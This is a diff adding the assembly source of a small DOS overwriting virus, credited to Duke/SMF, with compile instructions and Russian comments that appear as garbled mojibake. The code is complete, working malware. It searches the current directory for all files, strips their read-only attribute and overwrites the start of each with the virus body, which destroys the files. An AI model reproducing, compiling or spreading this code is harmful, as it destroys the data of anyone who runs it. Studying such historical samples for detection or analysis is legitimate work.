@@ -1,0 +1,54 @@
+   ; Virus Trivial.62.s2 (c) by Duke/SMF
+   ; Compile : masm tr_62_2.asm
+   ;           tlink tr_62_2.obj /t
+   ; Greetz to Kouch & Nowhere Man [NuKE]
+   ; *®à ¦ ¥â ¢á¥ ä ©«ë (¢ â®¬ ç¨«¥ R/O) ¢ â¥ªãé¥© ¤¨à¥ªâ®à¨¨.
+
+                   .model   tiny
+                   .code
+                   org     100h
+   virus_length    equ     finish - start      ;„«¨  ¢¨àãá 
+                   ; §  áç¥â â®£®, çâ® ¤«¨  ¢¨àãá  ¢ëç¨á«ï¥âáï
+                   ; ¨¬¥® ¢ íâ®¬ ¬¥áâ¥, ¢ë¨£àë¢ ¥¬ 2 ¡ ©â  !
+
+   start  :                                    ;* ç «® ¢¨àãá 
+                   mov     ah,4Eh              ;*®¨áª ¯¥à¢®£® ä ©« 
+                   mov     dx,offset file_spec ;DX ãª §ë¢ ¥â   "*.*"
+   infect:
+                   int     21h
+                   jnc     infect_file         ;…á«¨ ä ©«  ©¤¥, â® ¯®à ¦ ¥¬,
+                   ret                         ;¢ ¯à®â¨¢®¬ á«ãç ¥ ª®¥æ à ¡®âë.
+   infect_file:
+
+                   mov     ah,43h              ;*â¨ ª®¬ ¤ë ¡¥àãâ ä ©«®¢ë¥
+                   mov     al,0                ; âà¨¡ãâë ¨ ¬¥ïîâ ¨å  
+                   mov     dx,9Eh              ;¤®áâã¯ ª çâ¥¨î/§ ¯¨á¨, ¨
+                   int     21h                 ;ª®£¤  ¯à¨¤¥â ¢à¥¬ï ®âªàë¢ âì ä ©«
+                                               ;
+                   mov     ah,43h              ;¢¨àãá á¬®¦¥â ¯®à §¨âì ä ©«
+                   mov     al,1                ;á  âà¨¡ãâ®¬ 'read only'.
+                   mov     dx,9Eh              ;” ©« ®áâ ¢«ï¥âáï ¤®áâã¯ë¬
+                   mov     cl,0                ;¤«ï çâ¥¨ï/§ ¯¨á¨, ¯®áª®«ìªã
+                   int     21h                 ;íâ® ¨ªâ® ¥ ¯à®¢¥àï¥â.
+
+                   mov     ax,3D01h            ;Žâªàë¢ ¥¬ ä ©« ¤«ï § ¯¨á¨
+                   mov     dx,9Eh              ;DX ãª §ë¢ ¥â    ©¤¥ë© ä ©«
+                   int     21h
+
+                   xchg    bx,ax               ;BX á®¤¥à¦¨â ä ©«®¢ë© handle
+
+                   mov     ah,40h              ;”ãªæ¨ï § ¯¨á¨ ¢ ä ©«
+                   mov     cl,virus_length     ;CL = áª®«ìª® ¡ ©â ¯¨á âì
+                   mov     dx,offset start     ;DX =  ç «® ª®¤  ¢¨àãá 
+                   int     21h
+
+                   mov     ah,3Eh              ;‡ ªàë¢ ¥¬ ä ©«
+                   int     21h
+
+                   mov     ah,4Fh              ;*®¨áª á«¥¤ãîé¥£® ä ©« 
+                   jmp     infect              ;*¥à¥å®¤   § à ¦¥¨¥
+
+   file_spec       db      "*.*",0             ;Œ áª  ä ©«®¢ ¤«ï ¯®¨áª 
+
+   finish  :                                   ;Š®¥æ ¢¨àãá 
+                   end     start
